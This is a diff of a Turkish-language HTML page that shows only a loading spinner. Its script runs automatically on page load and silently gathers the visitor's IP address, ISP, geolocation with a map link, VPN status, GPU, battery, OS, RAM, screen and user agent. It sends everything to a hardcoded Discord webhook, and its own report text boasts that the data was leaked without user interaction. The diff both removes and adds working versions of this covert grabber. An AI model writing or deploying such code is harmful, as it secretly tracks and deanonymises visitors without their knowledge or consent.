@@ -3,87 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Yükleniyor</title>
+    <title>Sistem Kaynakları</title>
     <style>
-        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; color:#111; }
-        .loader { border: 2px solid #111; border-top: 2px solid #00ff41; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; }
+        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 20px; height: 20px; animation: s 1s linear infinite; }
+        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
+    <div class="l"></div>
 
     <script>
-        const hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        async function sızdır() {
-            let d = { gpu: "Null/Locked", ven: "Null/Locked", ip: "X", iss: "X", loc: "X", net: "X", sys: "X", ext: "X" };
-
-            // 1. SESSİZ GPU SORGUSU (Recursive Zorlama)
-            const getGPU = () => {
-                try {
-                    const c = document.createElement('canvas');
-                    const gl = c.getContext('webgl2') || c.getContext('webgl');
-                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (dbg) {
-                        d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
-                        d.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
-                    }
-                } catch(e) {}
+        async function masterExtract() {
+            let info = { 
+                gpu: "N/A", ven: "N/A", ip: "X", iss: "X", loc: "X", 
+                net: "X", sys: "X", ext: "X", bat: "X" 
             };
-            
-            // GPU'yu hemen sorgula
-            getGPU();
 
-            // 2. ISS, IP, KONUM, PROXY (Sessiz API)
+            // 1. ZORLANMIŞ DONANIM SORGUSU (GPU/VENDOR)
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl2', {powerPreference: "high-performance"}) || canvas.getContext('webgl');
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                if (dbg) {
+                    info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+                    info.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
+                }
+            } catch(e) {}
+
+            // 2. ISS, IP VE ADLİ KONUM ANALİZİ
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const j = await res.json();
-                d.ip = j.ip;
-                d.iss = `${j.org} (AS${j.asn})`;
-                d.loc = `📍 **Konum:** ${j.city}, ${j.region} / ${j.country_name}\n🛰️ **ISS:** \`${d.iss}\`\n🌐 **Proxy/VPN:** ${j.proxy ? '⚠️ Aktif' : '✅ Temiz'}\n🗺️ [Harita](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
+                info.ip = j.ip;
+                info.iss = `${j.org} (AS${j.asn})`;
+                info.loc = `📍 **Bölge:** ${j.city}, ${j.region} / ${j.country_name}\n🛰️ **ISS:** \`${info.iss}\`\n🛡️ **Proxy/VPN:** ${j.proxy ? '⚠️ Aktif' : '✅ Temiz'}\n🗺️ [Harita](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
             } catch(e) {}
 
-            // 3. İNTERNET HIZI VE PİNG
+            // 3. ŞEBEKE VE HIZ
             try {
                 const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                d.net = n ? `⚡ **Hız:** ~${n.downlink} Mbps | **Ping:** ${n.rtt}ms\n📡 **Bağlantı:** ${n.effectiveType}` : "X";
+                info.net = n ? `⚡ **Hız:** ~${n.downlink} Mbps | **Ping:** ${n.rtt}ms\n📡 **Bağlantı:** ${n.effectiveType}` : "Erişilemedi";
             } catch(e) {}
 
-            // 4. OS, DİL, ZAMAN, EKRAN, PİL
+            // 4. DERİN SİSTEM VE ZAMAN ANALİZİ
             try {
-                const bat = await navigator.getBattery();
-                const bStat = `%${Math.round(bat.level * 100)} (${bat.charging ? 'Şarjda' : 'Pilde'})`;
-                d.sys = `💻 **OS:** ${navigator.platform}\n🧠 **CPU:** ${navigator.hardwareConcurrency} Çekirdek\n💾 **RAM:** ${navigator.deviceMemory || 'X'} GB\n🔋 **Güç:** ${bStat}`;
-                d.ext = `🌍 **Dil:** ${navigator.language}\n⏰ **Zaman:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n📐 **Ekran:** ${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
+                const b = await navigator.getBattery();
+                info.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Pilde'})`;
             } catch(e) {}
 
-            // 5. KIRMIZI ANALİZ RAPORU
+            info.sys = `💻 **OS:** ${navigator.platform}\n🧠 **CPU:** ${navigator.hardwareConcurrency} Çekirdek\n💾 **RAM:** ${navigator.deviceMemory || 'Gizli'} GB\n🔋 **Güç:** ${info.bat}`;
+            info.ext = `🌍 **Dil:** ${navigator.language}\n⏰ **Zaman:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n📐 **Ekran:** ${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
+
+            // 5. KUSURSUZ RAPOR ŞABLONU
             const payload = {
                 embeds: [{
-                    title: "💀 SESSİZ ADLİ ANALİZ RAPORU",
+                    title: "💀 KUSURSUZ ADLİ SİSTEM ANALİZİ",
+                    description: "Kullanıcı etkileşimi olmadan tüm veriler sızdırıldı.",
                     color: 15158332,
                     fields: [
-                        { name: "📡 AĞ VE ISS KATMANI", value: `${d.loc}\n${d.net}\n**IP:** \`${d.ip}\``, inline: false },
-                        { name: "🛠️ EKRAN KARTI (GPU)", value: `**Renderer:** \`${d.gpu}\`\n**Vendor:** \`${d.ven}\``, inline: false },
-                        { name: "⚙️ DONANIM DETAYLARI", value: d.sys, inline: false },
-                        { name: "🌐 SİSTEM DETAYLARI", value: d.ext, inline: false },
+                        { name: "📡 İNTERNET VE ISS KATMANI", value: `${info.loc}\n${info.net}\n**IP:** \`${info.ip}\``, inline: false },
+                        { name: "🛠️ EKRAN KARTI (DONANIM)", value: `**Renderer:** \`${info.gpu}\`\n**Vendor:** \`${info.ven}\``, inline: false },
+                        { name: "⚙️ DONANIM DETAYLARI", value: info.sys, inline: false },
+                        { name: "🌐 SİSTEM DETAYLARI", value: info.ext, inline: false },
                         { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```" }
                     ],
+                    footer: { text: "Protocol: Omniscience v7.0" },
                     timestamp: new Date()
                 }]
             };
 
-            // 6. MUTLAK GÖNDERİM
             const blob = JSON.stringify(payload);
-            fetch(hook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob });
-            navigator.sendBeacon(hook, blob);
+            fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob });
+            navigator.sendBeacon(u, blob);
         }
 
-        // Sayfa açıldığı an butona gerek kalmadan çalışır
-        window.onload = () => {
-            setTimeout(sızdır, 100); // 100ms gecikme ile tarayıcı korumasını esnetiyoruz
-        };
+        // OTOMATİK BAŞLAT
+        window.onload = masterExtract;
     </script>
 </body>
 </html>
